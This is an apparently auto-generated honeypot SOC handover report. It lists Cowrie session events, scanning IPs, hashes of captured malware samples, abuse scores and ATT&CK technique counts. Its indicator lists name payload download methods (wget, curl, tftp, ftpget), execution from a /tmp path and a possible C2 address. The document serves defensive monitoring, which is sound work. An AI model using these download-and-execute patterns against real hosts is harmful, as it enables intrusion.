| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.command.success` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.log.closed` |
| `2026-07-24 16:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-24 15:00 | 2026-07-24 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]42` | **3** | 2026-07-24 15:12 | 2026-07-24 15:47 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-07-24 15:49 | 2026-07-24 15:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-07-24 16:21 | 2026-07-24 16:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-24 14:58 | 2026-07-24 15:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-07-24 15:22 | 2026-07-24 15:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]7` | **2** | 2026-07-24 16:21 | 2026-07-24 16:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]65` | **2** | 2026-07-24 15:27 | 2026-07-24 15:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.82.77[.]33` | **2** | 2026-07-24 15:06 | 2026-07-24 15:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]116` | 1 | 2026-07-24 15:31 | 2026-07-24 15:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.252.93[.]114` | 1 | 2026-07-24 15:13 | 2026-07-24 15:13 | 1s | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | 1 | 2026-07-24 16:03 | 2026-07-24 16:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `183.171.53[.]200` | 1 | 2026-07-24 15:10 | 2026-07-24 15:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.65.190[.]48` | 1 | 2026-07-24 14:58 | 2026-07-24 15:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-24 16:07 | 2026-07-24 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.153.34[.]144` | 1 | 2026-07-24 15:14 | 2026-07-24 15:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.198.224[.]5` | 1 | 2026-07-24 16:36 | 2026-07-24 16:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.101.64[.]6` | 1 | 2026-07-24 15:41 | 2026-07-24 15:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-07-24 15:33 | 2026-07-24 15:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.129.165[.]39` | 1 | 2026-07-24 16:25 | 2026-07-24 16:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]92` | 1 | 2026-07-24 16:02 | 2026-07-24 16:02 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.151[.]28` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 49 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `220.161.52[.]149` | CN | CHINANET Fujian province network | **100** ⚠️ | 50 |
| `207.254.71[.]129` | IE | MacStadium, Inc. | **100** ⚠️ | 50 |
| `180.168.60[.]146` | CN | Shanghai Xianshang Trading Co., Ltd. | **100** ⚠️ | 50 |
| `2.54.85[.]220` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `213.154.80[.]51` | SN | PCCI Internet | **100** ⚠️ | 50 |
| `5.101.64[.]6` | RU | public vlans of DC | **100** ⚠️ | 50 |
| `187.126.105[.]42` | BR | V tal | **100** ⚠️ | 50 |
| `66.132.195[.]65` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 375 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 360 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 65 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 64 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 64 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 415 cases |
| Tool 34  | Credential Extractor        | ✅ 386 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 84 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (4.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 359 priority case(s) shown individually · 21 recon entry/entries in table (9 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-24T17:41:52Z_
